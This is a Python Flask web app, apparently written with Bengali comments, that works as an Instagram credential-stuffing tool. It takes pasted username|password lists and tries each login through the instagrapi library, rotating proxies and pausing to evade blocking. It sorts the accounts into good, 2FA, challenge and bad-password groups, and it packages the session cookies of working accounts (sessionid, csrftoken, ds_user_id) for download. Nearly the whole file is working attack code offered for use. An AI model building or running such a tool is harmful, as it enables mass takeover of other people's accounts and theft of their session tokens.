from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
import asyncio
import aiohttp
import json
import time
import os
import random
from datetime import datetime
import threading
import tempfile
import zipfile
from io import BytesIO
import traceback

app = Flask(__name__)
CORS(app)

# স্টোরেজ
jobs = {}

class InstagramChecker:
    def __init__(self, proxies=None):
        self.proxies = proxies if proxies else []
        self.current_proxy_index = 0
        
    def get_next_proxy(self):
        """পরবর্তী প্রক্সি সিলেক্ট করুন"""
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        return proxy
    
    async def check_account(self, username, password):
        """একাউন্ট চেক করার মেইন ফাংশন"""
        try:
            # instagrapi ইম্পোর্ট এখানে করছি (error handling সহ)
            try:
                from instagrapi import Client
                from instagrapi.exceptions import LoginRequired, ChallengeRequired, TwoFactorRequired, BadPassword, ClientError
            except ImportError as e:
                return {
                    'status': 'error',
                    'error': f'instagrapi import error: {str(e)}. Run: pip install instagrapi'
                }
            
            proxy = self.get_next_proxy()
            cl = Client()
            
            if proxy:
                try:
                    cl.set_proxy(proxy)
                except:
                    pass
            
            # লগিন করার চেষ্টা
            cl.login(username, password)
            await asyncio.sleep(1)
            
            # সেশন ডাটা নেওয়া
            session_data = cl.get_session_data()
            
            # কুকি স্ট্রিং বানানো
            cookie_parts = []
            if session_data.get('sessionid'):
                cookie_parts.append(f"sessionid={session_data['sessionid']}")
            if session_data.get('csrftoken'):
                cookie_parts.append(f"csrftoken={session_data['csrftoken']}")
            if session_data.get('ds_user_id'):
                cookie_parts.append(f"ds_user_id={session_data['ds_user_id']}")
            
            cookie_string = '; '.join(cookie_parts)
            
            return {
                'status': 'success',
                'cookie': cookie_string,
                'username': username,
                'proxy_used': proxy if proxy else 'direct'
            }
            
        except Exception as e:
            error_str = str(e)
            
            # বিভিন্ন error চেক করা
            if 'two_factor' in error_str.lower() or '2fa' in error_str.lower():
                return {'status': '2fa', 'username': username, 'error': '2FA Required'}
            elif 'challenge' in error_str.lower():
                return {'status': 'challenge', 'username': username, 'error': 'Challenge Required'}
            elif 'password' in error_str.lower() or 'wrong' in error_str.lower():
                return {'status': 'bad_password', 'username': username, 'error': 'Wrong Password'}
            elif 'proxy' in error_str.lower():
                return {'status': 'proxy_error', 'username': username, 'error': f'Proxy Error: {error_str}'}
            else:
                return {'status': 'error', 'username': username, 'error': error_str}

async def process_batch(credentials_list, job_id, proxy_list=None):
    """ব্যাচ প্রসেসিং"""
    
    checker = InstagramChecker(proxy_list)
    total = len(credentials_list)
    batch_size = 3  # একসাথে ৩টা করে চেক (কমিয়ে দিলাম error এড়াতে)
    
    jobs[job_id]['progress'] = 0
    jobs[job_id]['status'] = 'processing'
    
    for i in range(0, total, batch_size):
        batch = credentials_list[i:i+batch_size]
        tasks = []
        
        for cred in batch:
            if '|' in cred:
                parts = cred.split('|', 1)
                if len(parts) == 2:
                    username, password = parts
                    tasks.append(checker.check_account(username.strip(), password.strip()))
        
        if tasks:
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for cred, result in zip(batch, batch_results):
                if '|' not in cred:
                    continue
                    
                username, password = cred.split('|', 1)
                
                if isinstance(result, Exception):
                    jobs[job_id]['results']['error'].append(f"{username}|{password}|ERROR: {str(result)}")
                    continue
                
                if result.get('status') == 'success':
                    jobs[job_id]['results']['good'].append(f"{username}|{password}|{result.get('cookie', '')}")
                elif result.get('status') == '2fa':
                    jobs[job_id]['results']['2fa'].append(f"{username}|{password}|2FA_REQUIRED")
                elif result.get('status') == 'challenge':
                    jobs[job_id]['results']['challenge'].append(f"{username}|{password}|CHALLENGE_REQUIRED")
                elif result.get('status') == 'bad_password':
                    jobs[job_id]['results']['bad'].append(f"{username}|{password}|BAD_PASSWORD")
                elif result.get('status') == 'proxy_error':
                    jobs[job_id]['results']['error'].append(f"{username}|{password}|PROXY_ERROR: {result.get('error', 'Unknown')}")
                else:
                    jobs[job_id]['results']['error'].append(f"{username}|{password}|ERROR: {result.get('error', 'Unknown')}")
        
        # প্রোগ্রেস আপডেট
        jobs[job_id]['progress'] = int((i + len(batch)) / total * 100) if total > 0 else 0
        jobs[job_id]['details'] = {
            'good': len(jobs[job_id]['results']['good']),
            '2fa': len(jobs[job_id]['results']['2fa']),
            'challenge': len(jobs[job_id]['results']['challenge']),
            'bad': len(jobs[job_id]['results']['bad']),
            'error': len(jobs[job_id]['results']['error'])
        }
        
        # বিরতি (ব্লক এড়াতে)
        await asyncio.sleep(3)
    
    jobs[job_id]['status'] = 'completed'

def run_async_process(credentials, job_id, proxy_list):
    """Async ফাংশন রান করার জন্য হেল্পার"""
    try:
        asyncio.run(process_batch(credentials, job_id, proxy_list))
    except Exception as e:
        jobs[job_id]['status'] = 'error'
        jobs[job_id]['results']['error'].append(f"SYSTEM_ERROR|SYSTEM|ERROR: {str(e)}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/submit', methods=['POST'])
def submit():
    try:
        data = request.json
        credentials = data.get('credentials', '').strip().split('\n')
        credentials = [c.strip() for c in credentials if c.strip()]
        
        # প্রক্সি লিস্ট প্রসেস
        proxy_input = data.get('proxies', '').strip()
        proxy_list = []
        
        if proxy_input:
            proxy_lines = proxy_input.split('\n')
            for line in proxy_lines:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxy_list.append(line)
        
        if not credentials:
            return jsonify({'error': 'কোনো ডাটা দেওয়া হয়নি'}), 400
        
        job_id = datetime.now().strftime("%Y%m%d%H%M%S")
        jobs[job_id] = {
            'status': 'pending',
            'progress': 0,
            'results': {
                'good': [],
                '2fa': [],
                'challenge': [],
                'bad': [],
                'error': []
            },
            'details': {},
            'total': len(credentials),
            'proxy_count': len(proxy_list)
        }
        
        # ব্যাকগ্রাউন্ডে প্রসেসিং শুরু
        thread = threading.Thread(target=run_async_process, args=(credentials, job_id, proxy_list))
        thread.start()
        
        return jsonify({'job_id': job_id, 'proxy_count': len(proxy_list)})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/status/<job_id>')
def status(job_id):
    if job_id not in jobs:
        return jsonify({'error': 'Job not found'}), 404
    
    return jsonify({
        'status': jobs[job_id]['status'],
        'progress': jobs[job_id]['progress'],
        'details': jobs[job_id].get('details', {}),
        'total': jobs[job_id]['total'],
        'proxy_count': jobs[job_id].get('proxy_count', 0)
    })

@app.route('/api/download/<job_id>/<type>')
def download(job_id, type):
    """আলাদা ফাইল ডাউনলোড"""
    try:
        if job_id not in jobs:
            return jsonify({'error': 'Job not found'}), 404
        
        valid_types = ['good', '2fa', 'challenge', 'bad', 'error', 'all']
        
        if type == 'all':
            # সব ক্যাটাগরি একসাথে
            memory_file = BytesIO()
            with zipfile.ZipFile(memory_file, 'w') as zf:
                for category in ['good', '2fa', 'challenge', 'bad', 'error']:
                    results = jobs[job_id]['results'][category]
                    if results:
                        content = '\n'.join(results)
                        zf.writestr(f"{category}_accounts.txt", content)
                
                # রিপোর্ট
                report = f"""Instagram Checker Report
Job ID: {job_id}
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Total Accounts: {jobs[job_id]['total']}
Proxies Used: {jobs[job_id].get('proxy_count', 0)}

Results:
- Good: {len(jobs[job_id]['results']['good'])}
- 2FA: {len(jobs[job_id]['results']['2fa'])}
- Challenge: {len(jobs[job_id]['results']['challenge'])}
- Bad Password: {len(jobs[job_id]['results']['bad'])}
- Errors: {len(jobs[job_id]['results']['error'])}
"""
                zf.writestr("report.txt", report)
            
            memory_file.seek(0)
            return send_file(
                memory_file,
                download_name=f'all_results_{job_id}.zip',
                as_attachment=True,
                mimetype='application/zip'
            )
        
        elif type in valid_types:
            results = jobs[job_id]['results'][type]
            
            if not results:
                return jsonify({'error': 'No results for this category'}), 404
            
            filename = f"{type}_accounts_{job_id}.txt"
            content = '\n'.join(results)
            
            return send_file(
                BytesIO(content.encode('utf-8')),
                download_name=filename,
                as_attachment=True,
                mimetype='text/plain'
            )
        
        else:
            return jsonify({'error': 'Invalid type'}), 400
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
